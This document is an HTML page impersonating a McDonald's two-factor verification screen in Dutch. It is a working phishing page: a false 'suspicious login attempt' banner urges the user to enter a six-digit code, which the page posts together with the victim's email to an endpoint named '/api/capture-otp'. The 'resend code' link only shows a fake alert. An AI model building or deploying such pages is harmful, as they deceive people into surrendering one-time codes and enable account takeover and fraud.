<!DOCTYPE html>
<html lang="nl-NL">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>Tweefactorverificatie — McDonald's</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Speedee:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Speedee', Arial, sans-serif; background: #f9f9f9; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .card { background: white; border-radius: 12px; padding: 40px; max-width: 440px; width: 100%; box-shadow: 0 2px 20px rgba(0,0,0,0.08); }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo svg { width: 60px; height: auto; }
        h1 { font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #292929; }
        p { color: #6f6f6f; text-align: center; font-size: 14px; line-height: 1.5; margin-bottom: 28px; }
        .otp-box { display: flex; gap: 8px; justify-content: center; margin-bottom: 24px; }
        .otp-box input { width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 700; font-family: inherit; border: 2px solid #d6d6d6; border-radius: 8px; outline: none; transition: border-color 0.2s; }
        .otp-box input:focus { border-color: #ffbc0d; box-shadow: 0 0 0 3px rgba(255, 188, 13, 0.2); }
        .btn { display: block; width: 100%; height: 52px; background: #ffbc0d; border: none; border-radius: 8px; font-family: inherit; font-size: 16px; font-weight: 600; color: #292929; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #e3a70b; }
        .btn:disabled { background: #d6d6d6; cursor: not-allowed; }
        .badge { background: #fff8e0; border: 1px solid #fbe4a7; border-radius: 8px; padding: 12px 16px; font-size: 13px; color: #6f6f6f; margin-bottom: 20px; text-align: center; }
        .resend { text-align: center; margin-top: 16px; font-size: 13px; color: #6f6f6f; }
        .resend a { color: #006bae; text-decoration: underline; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg width="46" height="41" viewBox="0 0 46 41" fill="none">
                <path fill="#ffbc0d" fill-rule="evenodd" d="M32.96 3.51c3.916 0 7.092 16.551 7.092 36.966h5.674C45.726 18.49 40.01.666 32.96.666c-4.01 0-7.59 5.357-9.93 13.733C20.69 6.024 17.111.668 13.1.668 6.05.667.333 18.49.333 40.476h5.675C6.008 20.06 9.185 3.51 13.1 3.51c3.917 0 7.094 15.278 7.094 34.122h5.672c0-18.844 3.177-34.122 7.094-34.122" clip-rule="evenodd"/>
            </svg>
        </div>

        <h1>Tweefactorverificatie</h1>
        <p>We hebben u een e-mail gestuurd. Dit kan enkele minuten duren. Voer de 6-cijferige code in.</p>

        <div class="badge">
            🔒 Extra beveiliging vanwege een verdachte inlogpoging
        </div>

        <form action="/api/capture-otp" method="POST" id="otpForm">
            <input type="hidden" name="email" id="hiddenEmail">
            <input type="hidden" name="otp" id="otpHidden">

            <div class="otp-box">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>

            <button class="btn" type="submit" id="submitBtn" disabled>Volgende</button>
        </form>

        <div class="resend">
            <a onclick="alert('Er is een nieuwe code verstuurd naar je e-mail.')">Geen code gekregen? Stuur opnieuw</a>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        document.getElementById('hiddenEmail').value = urlParams.get('email') || '';

        const inputs = document.querySelectorAll('.otp-box input');
        const submitBtn = document.getElementById('submitBtn');
        const otpHidden = document.getElementById('otpHidden');

        inputs.forEach((input, i) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value && i < 5) inputs[i + 1].focus();
                updateOtp();
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && i > 0) {
                    inputs[i - 1].focus();
                }
                if (e.key === 'Enter') document.getElementById('otpForm').submit();
            });
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
                paste.split('').forEach((char, i) => {
                    if (i < 6) inputs[i].value = char;
                });
                updateOtp();
                inputs[Math.min(paste.length, 5)].focus();
            });
        });

        function updateOtp() {
            let otp = '';
            inputs.forEach(i => otp += i.value);
            otpHidden.value = otp;
            submitBtn.disabled = otp.length !== 6;
        }
    </script>
</body>
</html>
